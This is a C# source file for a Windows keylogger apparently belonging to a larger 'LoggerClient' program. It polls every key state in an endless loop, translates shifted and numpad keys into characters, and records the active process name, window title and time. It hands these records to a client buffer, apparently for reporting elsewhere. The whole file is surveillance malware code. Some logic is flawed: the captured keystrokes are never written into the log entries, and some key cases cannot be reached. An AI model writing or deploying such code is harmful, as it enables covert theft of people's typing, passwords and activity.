using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;

namespace LoggerClient
{
    public class KeyLogger
    {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);
        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int GetWindowTextLength(IntPtr hWnd);

        private static StringBuilder userActions = new StringBuilder();

        public static void run()
        {
            StringBuilder keysPressed = new StringBuilder();

            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    bool shift = false;
                    short shiftState = (short)GetAsyncKeyState(16);

                    if ((shiftState & 0x8000) == 0x8000)
                    {
                        shift = true;
                    }
                    bool caps = Console.CapsLock;

                    bool isBigChar = shift | caps;

                    int state = GetAsyncKeyState(i);

                    if (state != 0) //state == 1 || state == -32767
                    {

                        keysPressed.Append(specialKeyInterpreter(i, shift, caps));
                     
                        if (((Keys)i).ToString().Length == 1)
                        {
                            if (isBigChar)
                                keysPressed.Append(((Keys)i).ToString().ToUpper());
                            else
                                keysPressed.Append(((Keys)i).ToString().ToLower());
                        }
                        else
                        {
                            keysPressed.AppendFormat("<{0}>", ((Keys)i).ToString());
                        }


                        if (keysPressed.Length > 10)
                        {
                            IntPtr currWindow = GetForegroundWindow();
                            uint pid;
                            GetWindowThreadProcessId(currWindow, out pid);
                            Process process = Process.GetProcessById((int)pid);
                            string processName = process.ProcessName;

                            StringBuilder header = new StringBuilder(GetWindowTextLength(currWindow) + 1);
                            GetWindowText(currWindow, header, header.Capacity);
                            DateTime processStartTimeUTC = process.StartTime.ToUniversalTime();

                            userActions.AppendFormat("[{0}|{1}] | [USER INPUT] | " +
                            "Process : {2} | Header : {3}",
                            processStartTimeUTC.ToShortDateString(),
                            processStartTimeUTC.ToShortTimeString(),
                            processName,
                            header
                            );
                            userActions.Append("\n");

                            keysPressed.Clear();
                            header.Clear();
                        }
                    }
                }

                Client.appendToBuffer(userActions);
                userActions.Clear();
                Thread.Sleep(100);
            }
        }


        private static string specialKeyInterpreter(int i, bool isShift, bool isCaps)
        {
            switch ((Keys)i)
            {
                case Keys.Capital:
                    return "";
                case Keys.Shift:
                    return "";
                case Keys.Space:
                    return " ";
                case Keys.RButton:
                    return "";
                case Keys.MButton:
                    return "";
                case Keys.LButton:
                    return "";
            }

            string keyPressed = "";

            if (i >= 96 && i <= 111)
            {
                switch (i)
                {
                    case 96:
                        keyPressed = "0";
                        break;
                    case 97:
                        keyPressed = "1";
                        break;
                    case 98:
                        keyPressed = "2";
                        break;
                    case 99:
                        keyPressed = "3";
                        break;
                    case 100:
                        keyPressed = "4";
                        break;
                    case 101:
                        keyPressed = "5";
                        break;
                    case 102:
                        keyPressed = "6";
                        break;
                    case 103:
                        keyPressed = "7";
                        break;
                    case 104:
                        keyPressed = "8";
                        break;
                    case 105:
                        keyPressed = "9";
                        break;
                    case 106:
                        keyPressed = "*";
                        break;
                    case 107:
                        keyPressed = "+";
                        break;
                    case 108:
                        keyPressed = "|";
                        break;
                    case 109:
                        keyPressed = "-";
                        break;
                    case 110:
                        keyPressed = ".";
                        break;
                    case 111:
                        keyPressed = "/";
                        break;
                }
            }
            else if ((i >= 48 && i <= 57) || (i >= 186 && i <= 192))
            {
                if (isShift)
                {
                    switch (i)
                    {
                        case 48:
                            keyPressed = ")";
                            break;
                        case 49:
                            keyPressed = "!";
                            break;
                        case 50:
                            keyPressed = "@";
                            break;
                        case 51:
                            keyPressed = "#";
                            break;
                        case 52:
                            keyPressed = "$";
                            break;
                        case 53:
                            keyPressed = "%";
                            break;
                        case 54:
                            keyPressed = "^";
                            break;
                        case 55:
                            keyPressed = "&";
                            break;
                        case 56:
                            keyPressed = "*";
                            break;
                        case 57:
                            keyPressed = "(";
                            break;
                        case 186:
                            keyPressed = ":";
                            break;
                        case 187:
                            keyPressed = "+";
                            break;
                        case 188:
                            keyPressed = "<";
                            break;
                        case 189:
                            keyPressed = "_";
                            break;
                        case 190:
                            keyPressed = ">";
                            break;
                        case 191:
                            keyPressed = "?";
                            break;
                        case 192:
                            keyPressed = "~";
                            break;
                        case 219:
                            keyPressed = "{";
                            break;
                        case 220:
                            keyPressed = "|";
                            break;
                        case 221:
                            keyPressed = "}";
                            break;
                        case 222:
                            keyPressed = "\"";
                            break;
                    }
                }
                else
                {
                    switch (i)
                    {
                        case 48:
                            keyPressed = "0";
                            break;
                        case 49:
                            keyPressed = "1";
                            break;
                        case 50:
                            keyPressed = "2";
                            break;
                        case 51:
                            keyPressed = "3";
                            break;
                        case 52:
                            keyPressed = "4";
                            break;
                        case 53:
                            keyPressed = "5";
                            break;
                        case 54:
                            keyPressed = "6";
                            break;
                        case 55:
                            keyPressed = "7";
                            break;
                        case 56:
                            keyPressed = "8";
                            break;
                        case 57:
                            keyPressed = "9";
                            break;
                        case 186:
                            keyPressed = ";";
                            break;
                        case 187:
                            keyPressed = "=";
                            break;
                        case 188:
                            keyPressed = ",";
                            break;
                        case 189:
                            keyPressed = "-";
                            break;
                        case 190:
                            keyPressed = ".";
                            break;
                        case 191:
                            keyPressed = "/";
                            break;
                        case 192:
                            keyPressed = "`";
                            break;
                        case 219:
                            keyPressed = "[";
                            break;
                        case 220:
                            keyPressed = "\\";
                            break;
                        case 221:
                            keyPressed = "]";
                            break;
                        case 222:
                            keyPressed = "'";
                            break;
                    }
                }
            }

            return keyPressed;
        }

    }

}